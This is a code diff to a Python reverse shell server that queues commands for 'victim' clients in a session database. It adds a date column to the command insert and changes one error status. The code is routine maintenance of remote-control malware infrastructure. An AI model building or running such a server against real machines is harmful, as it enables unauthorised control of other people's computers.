@@ -1,6 +1,7 @@
 """ The reverse shell server and request handler. """
 
 # ---- imports
+import datetime
 import json as js
 import sys
 from binascii import Error as b64decodeError
@@ -237,7 +238,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             self.get_client_type_from_db(victim_id) is None
             or self.get_client_type_from_db(victim_id) != ut.ClientType.Victim
         ):
-            return bad_request
+            return (False, HTTPStatus.EXPECTATION_FAILED)
 
         # Now let's check if the user is already in a session, but not with us
         # if that's the case, we can't write the command in the db, or even if the
@@ -255,7 +256,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # If we are in session with the victim and satisfy all the other requirements
         # we can proceed by inserting the command in the database.
         result = self.config.execute_on_session_db(
-            "INSERT INTO commands VALUES(?, ?, ?)", [command_id, victim_id, command]
+            "INSERT INTO commands VALUES(?, ?, ?, ?)",
+            [command_id, victim_id, command, datetime.date.today().isoformat()],
         )
 
         if result is None:
